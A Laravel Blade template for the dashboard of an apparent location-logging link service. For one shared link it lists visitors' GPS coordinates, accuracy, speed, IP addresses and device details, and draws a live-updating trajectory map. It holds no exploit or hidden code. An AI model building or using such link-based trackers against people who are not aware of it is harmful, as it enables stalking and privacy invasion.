@extends('layouts.app')

@section('title', 'Link #' . $link->token)

@section('content')
<div class="container">
    <!-- Breadcrumb & Header -->
    <div class="d-flex flex-wrap align-items-center justify-content-between mb-4 gap-3">
        <div>
            <nav aria-label="breadcrumb">
                <ol class="breadcrumb mb-1">
                    <li class="breadcrumb-item"><a href="{{ route('dashboard.index') }}" class="text-decoration-none text-muted">Dashboard</a></li>
                    <li class="breadcrumb-item active" aria-current="page">Link #{{ $link->token }}</li>
                </ol>
            </nav>
            <h3 class="fw-bold mb-0 d-flex align-items-center gap-2">
                Link #{{ $link->token }}
                @if($link->isValid())
                    <span class="badge bg-success bg-opacity-10 text-success border border-success border-opacity-25 fs-6">Active</span>
                @else
                    <span class="badge bg-danger bg-opacity-10 text-danger border border-danger border-opacity-25 fs-6">Expired / Disabled</span>
                @endif
            </h3>
        </div>
        <div class="d-flex gap-2">
            <a href="{{ route('dashboard.index') }}" class="btn btn-outline-secondary rounded-3">
                <i class="bi bi-arrow-left me-1"></i> Back to Dashboard
            </a>
            <form action="{{ route('dashboard.toggleLink', $link->id) }}" method="POST" class="d-inline">
                @csrf
                <button type="submit" class="btn btn-outline-{{ $link->is_active ? 'warning' : 'success' }} rounded-3">
                    <i class="bi bi-power me-1"></i> {{ $link->is_active ? 'Deactivate' : 'Activate' }}
                </button>
            </form>
            <form action="{{ route('dashboard.deleteLink', $link->id) }}" method="POST" class="d-inline" onsubmit="return confirm('Are you sure you want to delete this link and all its visits?');">
                @csrf
                @method('DELETE')
                <button type="submit" class="btn btn-outline-danger rounded-3">
                    <i class="bi bi-trash me-1"></i> Delete
                </button>
            </form>
        </div>
    </div>

    <!-- Link Info Box -->
    <div class="card-custom p-4 mb-4">
        <div class="row g-3 align-items-center">
            <div class="col-12 col-md-7">
                <label class="form-label text-muted small fw-semibold text-uppercase mb-1">Public Share Link</label>
                <div class="input-group">
                    <span class="input-group-text bg-light border-end-0"><i class="bi bi-link-45deg"></i></span>
                    <input type="text" class="form-control font-monospace bg-light border-start-0" value="{{ url('/l/' . $link->token) }}" readonly id="sessionUrl">
                    <button class="btn btn-primary px-3" type="button" id="copySessionBtn">
                        <i class="bi bi-clipboard me-1"></i> Copy
                    </button>
                    <a href="{{ url('/l/' . $link->token) }}" target="_blank" class="btn btn-outline-secondary">
                        <i class="bi bi-box-arrow-up-right me-1"></i> Open
                    </a>
                </div>
            </div>
            <div class="col-6 col-md-2">
                <div class="text-muted small fw-semibold text-uppercase mb-1">Total Pings</div>
                <div class="fs-4 fw-bold text-dark" id="totalPingsCount">{{ $link->visits->count() }}</div>
            </div>
            <div class="col-6 col-md-3">
                <div class="text-muted small fw-semibold text-uppercase mb-1">Expiration</div>
                <div class="small fw-semibold text-dark">
                    @if($link->expires_at)
                        {{ $link->expires_at->format('M d, Y H:i') }}
                        <span class="text-muted d-block">({{ $link->expires_at->diffForHumans() }})</span>
                    @else
                        <span class="text-success">Never (Persistent)</span>
                    @endif
                </div>
            </div>
        </div>
    </div>

    <!-- Map & Latest Location Pin -->
    <div class="card-custom p-4 mb-4">
        <div class="d-flex flex-wrap align-items-center justify-content-between mb-3 gap-2">
            <div>
                <h5 class="fw-bold mb-0"><i class="bi bi-geo-alt-fill text-danger me-2"></i>GPS Trajectory & Location Map</h5>
                <p class="text-muted small mb-0">Showing chronological path & accuracy boundary of all received location coordinates</p>
            </div>
            <div class="form-check form-switch d-flex align-items-center gap-2">
                <input class="form-check-input" type="checkbox" id="livePollingSwitch" checked>
                <label class="form-check-label small fw-semibold text-dark" for="livePollingSwitch">Live Auto-Update (5s)</label>
            </div>
        </div>
        <div id="sessionMap" style="height: 480px; width: 100%; border-radius: 12px; background: #e2e8f0;"></div>
    </div>

    <!-- Visit History Table -->
    <div class="card-custom p-4">
        <h5 class="fw-bold mb-3"><i class="bi bi-clock-history me-2 text-primary"></i>Recorded GPS Coordinates & Device Logs</h5>
        <div class="table-responsive">
            <table class="table table-hover align-middle mb-0" id="logsTable">
                <thead class="table-light">
                    <tr>
                        <th scope="col" class="py-3">#</th>
                        <th scope="col" class="py-3">Timestamp</th>
                        <th scope="col" class="py-3">Latitude & Longitude</th>
                        <th scope="col" class="py-3">Accuracy</th>
                        <th scope="col" class="py-3">Speed / Alt</th>
                        <th scope="col" class="py-3">IP Address</th>
                        <th scope="col" class="py-3">User Agent & Device</th>
                    </tr>
                </thead>
                <tbody id="logsTableBody">
                    @forelse($link->visits as $index => $visit)
                    <tr>
                        <td><span class="badge bg-secondary bg-opacity-25 text-dark rounded-circle px-2 py-1">{{ $link->visits->count() - $index }}</span></td>
                        <td>
                            <div class="fw-semibold text-dark">{{ $visit->created_at->format('M d, Y H:i:s') }}</div>
                            <div class="text-muted small">{{ $visit->created_at->diffForHumans() }}</div>
                        </td>
                        <td>
                            <a href="https://www.google.com/maps?q={{ $visit->latitude }},{{ $visit->longitude }}" target="_blank" class="font-monospace text-primary fw-bold text-decoration-none">
                                {{ number_format($visit->latitude, 6) }}, {{ number_format($visit->longitude, 6) }}
                                <i class="bi bi-box-arrow-up-right small ms-1"></i>
                            </a>
                        </td>
                        <td>
                            @if($visit->accuracy)
                                <span class="badge {{ $visit->accuracy < 50 ? 'bg-success' : 'bg-warning text-dark' }}">
                                    &plusmn;{{ round($visit->accuracy) }} meters
                                </span>
                            @else
                                <span class="text-muted small">—</span>
                            @endif
                        </td>
                        <td>
                            <div class="small">
                                <span class="text-muted">Alt:</span> {{ $visit->altitude ? round($visit->altitude) . 'm' : '—' }}<br>
                                <span class="text-muted">Speed:</span> {{ $visit->speed ? round($visit->speed * 3.6, 1) . ' km/h' : '—' }}
                            </div>
                        </td>
                        <td class="font-monospace small">{{ $visit->ip_address ?? '—' }}</td>
                        <td class="small" style="max-width: 250px;">
                            <div class="text-truncate" title="{{ $visit->user_agent }}">{{ $visit->user_agent }}</div>
                            @if($visit->device_info)
                                <div class="badge bg-light text-secondary border mt-1">{{ $visit->device_info }}</div>
                            @endif
                        </td>
                    </tr>
                    @empty
                    <tr id="noDataRow">
                        <td colspan="7" class="text-center py-4 text-muted">
                            <i class="bi bi-broadcast text-secondary display-6 d-block mb-2 opacity-50"></i>
                            Waiting for the user to open the link and grant location permission...
                        </td>
                    </tr>
                    @endforelse
                </tbody>
            </table>
        </div>
    </div>
</div>
@endsection

@push('scripts')
<script>
document.addEventListener('DOMContentLoaded', function () {
    // Copy URL
    const copyBtn = document.getElementById('copySessionBtn');
    if (copyBtn) {
        copyBtn.addEventListener('click', function () {
            const input = document.getElementById('sessionUrl');
            input.select();
            navigator.clipboard.writeText(input.value).then(() => {
                const orig = copyBtn.innerHTML;
                copyBtn.innerHTML = '<i class="bi bi-check-lg me-1"></i> Copied!';
                setTimeout(() => copyBtn.innerHTML = orig, 2000);
            });
        });
    }

    // Leaflet Map Initialization
    const map = L.map('sessionMap').setView([20.5937, 78.9629], 5);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19,
        attribution: '&copy; OpenStreetMap contributors'
    }).addTo(map);

    let markersLayer = L.featureGroup().addTo(map);
    let polylineLayer = L.polyline([], { color: '#4f46e5', weight: 4, dashArray: '6, 8' }).addTo(map);

    function updateMapWithData(visits) {
        markersLayer.clearLayers();
        const coords = [];

        if (visits && visits.length > 0) {
            // Sort ascending for path
            const sorted = [...visits].sort((a, b) => new Date(a.created_at) - new Date(b.created_at));

            sorted.forEach((visit, idx) => {
                const lat = parseFloat(visit.latitude);
                const lng = parseFloat(visit.longitude);
                const accuracy = parseFloat(visit.accuracy) || 0;
                const isLatest = (idx === sorted.length - 1);
                coords.push([lat, lng]);

                const dateStr = new Date(visit.created_at).toLocaleString();

                const popup = `
                    <div style="font-size: 13px;">
                        <strong style="color: ${isLatest ? '#10b981' : '#4f46e5'};">
                            ${isLatest ? '📍 Latest Position' : 'Ping #' + (idx + 1)}
                        </strong><br>
                        <strong>Lat/Lng:</strong> ${lat.toFixed(6)}, ${lng.toFixed(6)}<br>
                        <strong>Accuracy:</strong> ~${Math.round(accuracy)}m<br>
                        <strong>Time:</strong> ${dateStr}<br>
                        <a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank" style="color: #4f46e5; text-decoration: underline;">Open in Google Maps</a>
                    </div>
                `;

                const marker = L.marker([lat, lng]).bindPopup(popup);
                markersLayer.addLayer(marker);

                if (accuracy > 0) {
                    const circle = L.circle([lat, lng], {
                        radius: accuracy,
                        color: isLatest ? '#10b981' : '#4f46e5',
                        fillColor: isLatest ? '#34d399' : '#818cf8',
                        fillOpacity: 0.15,
                        weight: 1.5
                    });
                    markersLayer.addLayer(circle);
                }
            });

            polylineLayer.setLatLngs(coords);
            map.fitBounds(markersLayer.getBounds(), { padding: [50, 50], maxZoom: 16 });
        }
    }

    // Initial load from server-side data
    const initialVisits = @json($link->visits);
    updateMapWithData(initialVisits);

    // Live Polling
    function fetchLiveUpdates() {
        if (!document.getElementById('livePollingSwitch').checked) return;

        fetch('{{ route("dashboard.liveData", $link->id) }}')
            .then(res => res.json())
            .then(data => {
                if (data.visits) {
                    document.getElementById('totalPingsCount').innerText = data.visits.length;
                    updateMapWithData(data.visits);
                }
            })
            .catch(e => console.error('Polling error:', e));
    }

    setInterval(fetchLiveUpdates, 5000);
});
</script>
@endpush
